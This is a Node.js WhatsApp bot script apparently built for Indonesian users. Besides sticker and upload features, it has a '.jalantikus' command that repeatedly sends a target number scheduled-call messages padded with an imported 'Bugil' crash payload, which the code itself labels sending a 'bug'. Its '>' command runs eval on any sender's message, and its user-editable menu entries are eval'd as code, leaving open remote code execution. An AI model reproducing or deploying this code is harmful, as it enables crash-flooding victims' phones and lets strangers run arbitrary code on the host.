
const axios = require('axios'); 
var {Bugil}=require('./bug')
//console.log(Bugil)

const Pino = require('pino');
const FormData = require('form-data')
const fs = require('fs');
const request = require('request-promise');
const https = require('https');
const cheerio = require('cheerio');
const modules = require('./mod');
for (const im in modules){
    eval(modules[im].toString())
}
console.log(modules)
const all = fs.readFileSync('mod.js','utf-8');
const moment = require('moment-timezone');
//console.log(moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss"))
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const logo = fs.readFileSync('logo.jpg');
const querystring = require("querystring");
const { useMultiFileAuthState} = require("@whiskeysockets/baileys");
const {downloadMediaMessage} = require('@whiskeysockets/baileys')
const { default : makeWaSocket } = require("@whiskeysockets/baileys");
let stutu = false;
let comand = []
let dic = JSON.parse(fs.readFileSync('menu.json', 'utf8'))
let menu = dic.menu
for (menuq of menu){
    comand.push(menuq.name)
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}








async function konek(){
    try{
    const auth = await useMultiFileAuthState("aauth");
    const soket = makeWaSocket({
        printQRInTerminal: true,
        browser: ["BotDris", "Chromee", "2.0.0"],
        auth: auth.state,
        logger: Pino({ level: "silent" })
    });
   // console.log(soket)
    soket.ev.on("creds.update", auth.saveCreds);
    soket.ev.on("connection.update", ({ connection }) => {
        if (connection === "open") {
            console.log("Wa yang tersambung : " + soket.user.id.split(':')[0])
        }
        if (connection === "close") konek();
    });
    soket.ev.on("messages.upsert", async ({ messages }) => {
        try{
            const m = messages[0];
            console.log(m)
            soket.readMessages([m.key])
            let wa_number = m.key.remoteJid;
            const userg = m.key.participant || wa_number;
            soket.sendPresenceUpdate('recording', wa_number)
            //soket.sendMessage(wa_number,{text:JSON.stringify(m)})
            //console.log(messages)
            const m2 = m.message;
           // console.log(m2?.extendedTextMessage || m2)
            let prompt = m2[Object.keys(m2)[0]]
            let fakeReplys = {
                    key: {
                        remoteJid: 'status@broadcast',
                        fromMe: false,
                        id: 'A82C19B19F9E193BE29EEC1EA5BCF010',
                        participant: userg},
                    messageTimestamp: 1701492238,
                    pushName: 'Muhamad Idris 10TKJ2',
                    broadcast: true,
                        message: {
                            extendedTextMessage: {
                                text: prompt,
                                textArgb: 4294967295,
                                backgroundArgb: 4290879551,
                                font: 1,
                                previewType: 0,
                                inviteLinkGroupTypeV2: 0
                            }
                        }
                }
                if (wa_number.split('@')[1]==='g.us'){
                    fakeReplys = m
                }
            function audioMessage(text,mime) {
                soket.sendMessage(wa_number,{
                        audio: text,
                        mimetype:mime,
                        //mentions:[wa_number],
                        contextInfo:{
                            mentionedJid: [userg],
                            externalAdReply:{
                                title:'SimpleBot',
                                body: 'Tamsis X Code',
                                thumbnail: logo,
                                mediaType:1,
                                showAdAttribution: true
                            }
                        },
                    },{
                        quoted:fakeReplys
                    }
                    )
            }
            function imageMessage(img) {
                soket.sendMessage(wa_number,{
                        image: img,
                        mentions:[wa_number],
                        contextInfo:{
                            mentionedJid: [userg],
                            externalAdReply:{
                                title:'SimpleBot',
                                body: 'Tamsis X Code',
                                thumbnail: logo,
                                mediaType:1,
                                showAdAttribution: true
                            }
                        },
                    },{
                        quoted:fakeReplys
                    }
                    )
            }
            function videoMessage(vid) {
                soket.sendMessage(wa_number,{
                        video: vid,
                        mentions:[wa_number],
                        contextInfo:{
                            mentionedJid: [userg],
                            externalAdReply:{
                                title:'SimpleBot',
                                body: 'Tamsis X Code',
                                thumbnail: logo,
                                mediaType:1,
                                showAdAttribution: true
                            }
                        },
                    },{
                        quoted:fakeReplys
                    }
                    )
            }
            function textMessage(text) {
                soket.sendMessage(wa_number,{
                        text: text,
                        mentions:[wa_number],
                        contextInfo:{
                            mentionedJid: [userg],
                            externalAdReply:{
                                title:'SimpleBot',
                                body: 'Tamsis X Code',
                                thumbnail: logo,
                                mediaType:1,
                                showAdAttribution: true,
                                sourceUrl:'https://chat.whatsapp.com/FGvkXIWfCzgKKCJvQDdQEf',
                            }
                        },
                    },{
                        quoted:fakeReplys
                    }
                    )
            }
            function stickerMessage(text) {
                soket.sendMessage(wa_number,{
                        sticker: text,
                        //author:"Tamsis X Code",
                        packname:"SimpleBot",
                        mentions:[wa_number],
                        contextInfo:{
                            mentionedJid: [userg],
                            externalAdReply:{
                                title:'SimpleBot',
                                body: 'Tamsis X Code',
                                thumbnail: logo,
                                mediaType:1,
                                showAdAttribution: true
                            }
                        },
                    },{
                        quoted:fakeReplys
                    }
                    )
            }

            //console.log(m)
            if (Object.keys(m2).includes('imageMessage') || Object.keys(m2).includes('videoMessage')){
                let type = 'videoMessage'
                let name = 'x.mp4'
                if (Object.keys(m2).includes('imageMessage')){
                    type = 'imageMessage';
                    name = 'x.jpg'
                }

                const mCaption = (m2['imageMessage'] || m2['videoMessage']).caption
                console.log(`${type} : ${mCaption}`)
                fakeReplys=m

                if (mCaption==='.toUrl'){
                    //imageMessage(media)
                    const media = await downloadMediaMessage(m,'buffer');
                    const results = await uploadFileBuffer(media,name)
                    textMessage(results)
                }else if (mCaption==='.sticker'){
                    const media = await downloadMediaMessage(m,'buffer');
                    if (type !='videoMessage'){
                        const webp = await ToStic(media, {author:'Tamsis X Code',packname:'SimpleBot'})
                        stickerMessage(fs.readFileSync(webp))
                    }else{
                        const webp = await writeExifVid(media, {author:'Tamsis X Code',packname:'SimpleBot'})
                        stickerMessage(fs.readFileSync(webp))
                    }
                }
                prompt = false
            } else if (typeof prompt != 'string'){
                prompt = prompt.text
            }

            if (typeof prompt === 'string'){
                console.log(`textMessage : ${prompt}`)
                if (prompt.split(' ')[0] === '.toUrl' || prompt.split(' ')[0] === '.sticker'){
                    textMessage('butuh video/gambar')
                }
                if (prompt.split(' ')[0] === '.jalantikus'){

                    let u_comand = prompt.replace(prompt.split(' ')[0]+' ','');
                    let vir = prompt.split(' ')[1]+'@s.whatsapp.net' || wa_number

                    let jum = '2'
                    if (u_comand.split('|')[1]!=undefined){
                        vir = u_comand.split('|')[0]
                        jum = u_comand.split('|')[2]
                    }else{
                        vir = wa_number;
                        jum= u_comand
                    }

                    for (let x = 0;x<parseInt(jum);x++){
                    await sleep(2000)
                    var scheduledCallCreationMessage = await generateWAMessageFromContent(vir, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": Bugil+Bugil+Bugil+Bugil,
}
}), { userJid: vir, quoted : fakeReplys});

                    //console.log(scheduledCallCreationMessage);
                    const x = await soket.relayMessage(vir, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
                    //console.log(scheduledCallCreationMessage)
                    textMessage('succes kirim bug emoji by jalantikus.com ke nomer '+prompt.split(' ')[1]+'@s.whatsapp.net' || wa_number)}
                }
                if (prompt.split(' ')[0] === '>'){
                    try{
                      let u_comand = prompt.replace(prompt.split(' ')[0]+' ','');
                      eval(u_comand)
                    }catch(eerr){
                      textMessage(String(eerr))
                    }
                }
                if (prompt.split(' ')[0] === '.menu' && ((m.key.participant || m.key.remoteJid ) === '6281563375928@s.whatsapp.net' || (m.key.participant || m.key.remoteJid ) === '6283115331009@s.whatsapp.net')){
                    const listmenu = comand.map(item => '🚩 ' + item).join('\n');
                    soket.sendMessage(wa_number,{
                        //canonicalUrl:"https://github.com/kaii-devv",
                        text: `
Hai *@${userg.split('@')[0]}* Ganteng
Wellcome in SimpleBot by *@Tamsis X Code*
Follow sosmed ku gan :
> https://github.com/kaii-devv
> https://www.facebook.com/100066790856758

🚩 .addfitur 
🚩 .dellfitur

🚩 .menu
🚩 .jalantikus
🚩 .toUrl
🚩 .sticker
${listmenu}`,
                        //mentions:[wa_number],
                        contextInfo:{
                            mentionedJid: [userg],
                            externalAdReply:{
                                title:'SimpleBot',
                                body: 'Tamsis X Code',
                                //canonicalUrl: 'https://www.facebook.com/',
                                thumbnail: logo,
                                sourceUrl:'https://github.com/kaii-devv',
                                sourceType:"PHOTO",
                                previewType:0,
//                                showAdAttribution: true
                            }
                        },
                    },{
                        quoted:fakeReplys
                    }
                    )
                }else if (comand.includes(prompt.split(' ')[0])){
                    let u_comand = prompt.replace(prompt.split(' ')[0]+' ','');
                    if (u_comand.split('.')[0] === 'get'){
                        if (u_comand.split('.')[1]==='info' || ((m.key.participant || m.key.remoteJid ) === '6281563375928@s.whatsapp.net' || (m.key.participant || m.key.remoteJid ) === '6283115331009@s.whatsapp.net')){
                            try{
                              textMessage(String(menu[comand.indexOf(prompt.split(' ')[0])][u_comand.split('.')[1]]))
                            }catch(err) {textMessage(String(err))}
                        }
                    }else if (['info','name','s_command','function','s_function'].includes(u_comand.split('=#=')[0])){
                        dic['menu'][comand.indexOf(prompt.split(' ')[0])][u_comand.split('=#=')[0]] = u_comand.split('=#=')[1]
                        fs.writeFileSync('menu.json', JSON.stringify(dic, null, 2), 'utf-8');
                    }else if (Object.keys(menu[comand.indexOf(prompt.split(' ')[0])]).length > 3){
                        if(u_comand != undefined && u_comand!='' && u_comand!=' '){
                            try{
                                eval(menu[comand.indexOf(prompt.split(' ')[0])]['function']);
                                eval(menu[comand.indexOf(prompt.split(' ')[0])]['s_function']);
                                eval(menu[comand.indexOf(prompt.split(' ')[0])]['s_command'])}catch (err){textMessage(String(err))}
                            }
                    }else{
                        console.log(Object.keys(menu[comand.indexOf(prompt.split(' ')[0])]).length)
                        const sisa = ['name','s_command','function','s_function'].filter(item => !Object.keys(menu[comand.indexOf(prompt.split(' ')[0])]).includes(item));
                        soket.sendMessage(wa_number,{text:'fitur ini belum lengkap\nmasih butuh : '+sisa.join(', ')},{quoted:fakeReplys})
                    }
                }else if (prompt.split(' ')[0]==='.addfitur'){
                    if (!comand.includes(prompt.split(' ')[1])){
                        dic.menu.push({'name':prompt.split(' ')[1]})
                        fs.writeFileSync('menu.json', JSON.stringify(dic, null, 2), 'utf-8');
                        comand = [];
                        dic = JSON.parse(fs.readFileSync('menu.json', 'utf8'));
                        menu = dic.menu
                        for (menuq of menu){
                            comand.push(menuq.name)}
                        textMessage(`berhasil add fitur ${prompt.split(' ')[1]} ke dalam bot`)
                    }else{
                        textMessage(`fitur ${prompt.split(' ')[1]} sudah ada sebelum kamu add`)}
                }else if (prompt.split(' ')[0]==='.dellfitur'  && ((m.key.participant || m.key.remoteJid ) === '6281563375928@s.whatsapp.net' || (m.key.participant || m.key.remoteJid ) === '6283115331009@s.whatsapp.net') ){
                    const object = prompt.split(' ')[1];
                    const index = comand.indexOf(object)
                    if (index!=-1){
                        dic.menu.splice(index,1)
                        fs.writeFileSync('menu.json', JSON.stringify(dic, null, 2), 'utf-8');
                        comand = [];
                        dic = JSON.parse(fs.readFileSync('menu.json', 'utf8'));
                        menu = dic.menu
                        for (menuq of menu){
                            comand.push(menuq.name)}

                        textMessage(`berhasil delete fitur ${object} dari bot`)
                    }
                };
              soket.chatModify({
                  delete: true,
                  lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]
              },wa_number)
            }
        }catch(err){console.log(err)}
    })}
  catch (we){
    stutu=false;
    console.log(we)
  }
}
//const semuaFungsi = Object.getOwnPropertyNames(module.exports).filter(name => typeof module.exports[name] === 'function' || typeof module.exports[name] === 'AsyncFunction');
//console.log(semuaFungsi)
// Menambahkan
//konek()

const express = require('express');
const app = express();
const port = '0000';
app.get('/', (req, res) => {
  if (!stutu) {
    stutu = true;
    konek()

    res.send({'play':stutu})

  } else {
    res.send({'play':stutu});
  }
});
//module.exports = app;
//app.listen()
app.listen(process.env.PORT || 3000)
